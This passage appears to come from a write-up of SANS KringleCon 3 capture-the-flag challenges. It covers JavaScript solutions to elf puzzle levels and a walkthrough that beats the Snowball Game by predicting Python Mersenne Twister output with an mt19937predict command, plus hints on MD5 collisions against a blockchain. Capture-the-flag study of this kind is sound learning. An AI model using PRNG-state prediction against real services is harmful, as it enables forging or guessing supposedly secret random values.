    <img data-src="/images/kringlecon3/games/game02_10.webp" alt="Munchkin #0 objective" data-caption="Munchkin #0 objective" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Munchkin #0 objective
      
        
        
      
    </figcaption>
  
</figure>
<p>There is an additional handicap: <code>elf.moveTo(object)</code> has been disabled. The solution is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">j</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="nx">i</span>
  <span class="nx">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveDown</span><span class="p">(</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">j</span><span class="p">)</span>
  <span class="nx">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">:</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveRight</span><span class="p">(</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">sum</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">a</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">filter</span><span class="p">(</span><span class="nx">e</span> <span class="p">=&gt;</span> <span class="k">typeof</span> <span class="nx">e</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span>
    <span class="nx">sum</span> <span class="o">=</span> <span class="nx">sum</span> <span class="o">+</span> <span class="nx">a</span><span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">a</span> <span class="o">+</span> <span class="nx">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nx">sum</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">tell_munch</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><div class="alert alert-warning" role="alert" data-dir="ltr">Level 8: Program the elf to the end goal in no more than 40 lines of code and no more than 10 elf command/function execution statements in your code.</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_11.webp" alt="level 8 map" data-caption="level 8 map" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      level 8 map
      
        
        
      
    </figcaption>
  
</figure>
<p>The levers' objectives are all the same, we need to respond with the lever value that it returns added to the values of all the previous levers. Each lever will lift the next bridge.</p>
<p>The <em>Munchkin</em> <code>#0</code> objective is:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_12.webp" alt="Munchkin #0 objective" data-caption="Munchkin #0 objective" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Munchkin #0 objective
      
        
        
      
    </figcaption>
  
</figure>
<p>Again, there is an additional handicap: <code>elf.moveTo(object)</code> has been disabled.<br />
Solution:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">sum</span> <span class="o">=</span> <span class="mi">0</span>
<span class="kd">var</span> <span class="nx">answer</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">j</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span>
  <span class="nx">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveRight</span><span class="p">(</span><span class="nx">j</span><span class="p">)</span> <span class="o">:</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">moveLeft</span><span class="p">(</span><span class="nx">j</span><span class="p">)</span>
  <span class="nx">sum</span> <span class="o">=</span> <span class="nx">sum</span> <span class="o">+</span> <span class="nx">elf</span><span class="p">.</span><span class="nx">get_lever</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">pull_lever</span><span class="p">(</span><span class="nx">sum</span><span class="p">)</span>
  <span class="nx">elf</span><span class="p">.</span><span class="nx">moveUp</span><span class="p">(</span><span class="nx">j</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">json</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">json</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">answer</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">json</span><span class="p">[</span><span class="nx">i</span><span class="p">]).</span><span class="nx">find</span><span class="p">(</span><span class="nx">key</span> <span class="p">=&gt;</span> <span class="nx">json</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="nx">key</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;lollipop&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">answer</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="nx">answer</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span>
<span class="p">}</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">tell_munch</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
<span class="nx">elf</span><span class="p">.</span><span class="nx">moveRight</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>And with that, we completed all the <em>Javascript</em> challenges:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game02_13.webp" alt="Gave Over!" data-caption="Gave Over!" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Gave Over!
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="snowball-game">Snowball Game</h3>
<hr />
<div class="box">[ELF] <strong>Tangle Coalbox</strong> [LOCATION] <em>Speaker UNpreparedness Room</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_01.webp" alt="Snowball Game location" data-caption="Snowball Game location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Snowball Game location
      
        
        
      
    </figcaption>
  
</figure>
<p>The last game is monitored by <strong>Tangle Coalbox</strong>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Tangle Coalbox:</strong><br />
Howdy gumshoe. I&rsquo;m <strong>Tangle Coalbox</strong>, resident sleuth in the <em>North Pole</em>.</p>
<p>If you&rsquo;re up for a challenge, I&rsquo;d ask you to look at this here <em>Snowball Game</em>. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the <em>Easy</em> level, but the <em>Impossible</em> level is, well… I&rsquo;d call it impossible, but I just saw someone beat it! I&rsquo;m sure something&rsquo;s off here.</p>
<p>Could it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an <em>Easy</em> game to cheat a bit.</p>
<p>But on <em>Impossible</em>, the best you get are rejected player names in the page comments. Can you use those somehow?<br />
Check out <strong>Tom Liston</strong>&rsquo;s talk for more info, if you need it.</p>
</div>
<p>And the hints he gives us are:</p>
<div class="notices success" data-title="The Snowball game hints">
  <ul>
<li>PRNG Seeding - While system time is probably most common, developers have the option to <a href="https://docs.python.org/3/library/random.html">seed</a> pseudo-random number generators with other values.</li>
<li>Extra Instances - Need extra Snowball Game instances? Pop them up in a new tab from <a href="https://snowball2.kringlecastle.com/">https://snowball2.kringlecastle.com</a>.</li>
<li>Mersenne Twister - Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might <a href="https://github.com/kmyk/mersenne-twister-predictor/blob/master/readme.md">predict</a> upcoming values.</li>
<li>Twisted Talk - Tom Liston is giving two talks at once - amazing! One is about the <a href="https://www.youtube.com/watch?v=Jo5Nlbqd-Vg">Mersenne Twister</a>.</li>
</ul>

</div>
<p>We can as well directly access the game from <a href="https://snowball2.kringlecastle.com/">https://snowball2.kringlecastle.com/</a> which will be more convenient for analysis. The game is an equivalent of the <em>Battleship</em> board game, we need to throw snowballs and hit the hidden snow forts until we destroy all of them. There are 4 different difficulties.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_02.webp" alt="Snowball Fight" data-caption="Snowball Fight" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Snowball Fight
      
        
        
      
    </figcaption>
  
</figure>
<p><strong>Easy and Medium:</strong><br />
In the <em>Easy</em> and <em>Medium</em> level, we can choose the <code>Player Name</code> and can beat the game quite easily by playing normally as the computer is not very smart:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_03.webp" alt="easy game" data-caption="easy game" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      easy game
      
        
        
      
    </figcaption>
  
</figure>
<p>When we win we get the following message:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_05.webp" alt="game win" data-caption="game win" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      game win
      
        
        
      
    </figcaption>
  
</figure>
<p>In the case we loose we get:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_04.webp" alt="game Over" data-caption="game Over" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      game Over
      
        
        
      
    </figcaption>
  
</figure>
<p>So if our understanding is correct, in the <em>Easy</em> and <em>Medium</em> level we can choose what is the seed used to generate the board. This means that if we use always the same seed, the board will always be the same. And it appears that the seed used on these levels is the <code>Player Name</code>. For instance, for a <code>seed=noobintheshell</code> we get the following enemy board each time:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_08.webp" alt="solution board seed=noobintheshell" data-caption="solution board seed=noobintheshell" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      solution board seed=noobintheshell
      
        
        
      
    </figcaption>
  
</figure>
<p>The same goes for our board that is as well always the same for a given <code>seed</code>.</p>
<p><strong>Hard:</strong><br />
In <em>Hard</em> mode, we can&rsquo;t choose the seed, however, we see it (our <code>Player Name</code>) when we start the game. So what we can do to beat this level is to run the game in <em>Easy</em> mode (in another tab) with the seed used in <em>Hard</em> mode. We will know where the snow castles are.</p>
<p><strong>Impossible:</strong><br />
In this mode, we can&rsquo;t make any single mistake as the attacker is successful at each turn.</p>
<p>Here, we do not get to know the <code>seed</code> used at all. However, we get to know from the game description that hundreds of random <code>seed</code> are generated before one is picked up. The tested ones are shown in the <em>HTML</em> code of the page:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_06.webp" alt="random seeds attempted - snippet" data-caption="random seeds attempted - snippet" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      random seeds attempted - snippet
      
        
        
      
    </figcaption>
  
</figure>
<p>As we know from the hints, the <em>Python</em> <code>random</code> function is used to generate those random numbers. This function uses the <em>Marsenne-Twister</em> algorithm for the <em>PRNG</em>. This algorithm has a known weakness: if we have enough consecutive random numbers, we can possibly predict the next ones. We can use the <code>marsene-twister-predictor</code> to achieve that. We can install it with:</p>
<div class="box">$ pip3 install mersenne-twister-predictor</div>
<p>Then we need to get the list of random numbers that we saw in the <em>HTML</em> code in a text file, one number per line. For the prediction to work, we need exactly the last 624 generated random numbers because <em>Marsene-Twister</em> uses a state table of 624 values. Then simply call the below command to get the next random number:</p>
<div class="box">$ cat random_numbers.txt | mt19937predict | head -n 1<br />
71766020</div>
<p>Then, as for the <em>Hard</em> level, we can use this seed on the <em>Easy</em> level to get the castle placement and beat the <em>Impossible</em> level:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game01_07.webp" alt="impossible win!" data-caption="impossible win!" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      impossible win!
      
        
        
      
    </figcaption>
  
</figure>
<div class="notices info" data-title="Note">
  To validate the challenge, this must be done from inside the game terminal, not from the dedicated website.
</div>
<p><strong>Tangle</strong> gives us some hints to beat <a href="#11a---naughtynice-list-with-blockchain-investigation-part1">Objective 11a</a> and <a href="#11b---naughtynice-list-with-blockchain-investigation-part2">Objective 11b</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Tangle Coalbox:</strong><br />
Crikey - that&rsquo;s it! You&rsquo;ve done the <em>Impossible</em>! You&rsquo;ve impressed this old elf today. Great work identifying and abusing the pseudo-random sequence.</p>
<p>Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the <em>Naughty/Nice Blockchain</em> with this? If you have control over to bytes in a file, it&rsquo;s easy to create <em>MD5</em> hash collisions. Problem is: there&rsquo;s that nonce that he would have to know ahead of time.</p>
<p>A blockchain works by &ldquo;chaining&rdquo; blocks together - so there&rsquo;s no way that <strong>Jack</strong> could change it without it messing up the chain… Maybe if you look at the block that seems like it got changed, it might help. If <strong>Jack</strong> was able to change the block AND the document without changing the hash… that would require a very <em>UNIque hash COLLision</em>.</p>
<p>Apparently <em>Jack</em> was able to change just 4 bytes in the block to completely change everything about it. It&rsquo;s like some sort of evil game to him. That&rsquo;s about all the help I can give you, kid, but <strong>Prof. Petabyte</strong> may have more.</p>
</div>
<div class="notices success" data-title="Objective 11a hints">
  <ul>
<li>MD5 Hash Collisions - If you have control over to bytes in a file, it&rsquo;s easy to create MD5 <a href="https://github.com/corkami/collisions">hash collisions</a>. Problem is: there&rsquo;s that nonce that he would have to know ahead of time.</li>
</ul>

</div>
<div class="notices success" data-title="Objective 11b hints">
  <ul>
<li>Blockchain &hellip; Chaining - A blockchain works by &ldquo;chaining&rdquo; blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there&rsquo;s no way that Jack could change an existing block without it messing up the chain&hellip;</li>
<li>Blockchain Talk - Qwerty Petabyte is giving <a href="https://www.youtube.com/watch?v=7rLMl88p-ec">a talk</a> about blockchain tomfoolery!</li>
<li>Block Investigation - The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there&rsquo;s no way it could happen, maybe if you look at the block that seems like it got changed, it might help.</li>
<li>Unique Hash Collision - If Jack was somehow able to change the contents of the block AND the document without changing the hash&hellip; that would require a very <a href="https://github.com/cr-marcstevens/hashclash">UNIque hash COLLision</a>.</li>
<li>Imposter Block Event - Shinny Upatree swears that he doesn&rsquo;t remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting.</li>
<li>Minimal Changes - Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It&rsquo;s like some sort of <a href="https://speakerdeck.com/ange/colltris">evil game</a> to him.</li>
</ul>

</div>
<h2 id="items">Items</h2>
<p>Some items are spread around the <strong>Santa</strong>&rsquo;s castle. At the exception of the <em>Proxmark3</em>, used to complete <a href="#objective-5---open-hidlock">Objective 5</a>, the items can only be used to operate the <em>Santavator</em>. Here is their location:</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Location</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Broken Candycane</td>
<td>Near the castle entrance, on the floor</td>
<td>Like one you&rsquo;d find between the couch cushions</td>
</tr>
<tr>
<td>Hex Nut 1</td>
<td><em>Entry Area</em> next to the <em>Santavator</em></td>
<td>An unremarkable, stainless steel, hex nut</td>
</tr>
<tr>
<td>Hex Nut 2</td>
<td><em>Dining Room</em>, hidden under the table</td>
<td>An unremarkable, stainless steel, hex nut</td>
</tr>
<tr>
<td>Green Bulb</td>
<td>Top left corner of the <em>Courtyard</em></td>
<td>It&rsquo;s a green bulb from those big, old-school christmas lights.</td>
</tr>
<tr>
<td>Elevator Service Key</td>
<td>Talk to <strong>Sparkle Redberry</strong> next to the <em>Satavator</em></td>
<td>This key opens the service panel on the Santavator.</td>
</tr>
<tr>
<td>Red Bulb</td>
<td>Top right of the <em>Talks Lobby</em> (2nd floor)</td>
<td>It&rsquo;s a red bulb from those big, old-school christmas lights.</td>
</tr>
<tr>
<td>Elevator 1.5 Button</td>
<td>Bottom right of the <em>Speaker UNpreparedness Room</em></td>
<td>Like those awkward semi-sequels, this button goes almost to the next floor</td>
</tr>
<tr>
<td>Large Marble</td>
<td><em>Workshop</em>, on the floor</td>
<td>It&rsquo;s a marble&hellip;that attracts sparkles.</td>
</tr>
<tr>
<td>Rubber Ball</td>
<td><em>Wrapping Room</em>, on the floor</td>
<td>Great for bouncing electrons, probably.</td>
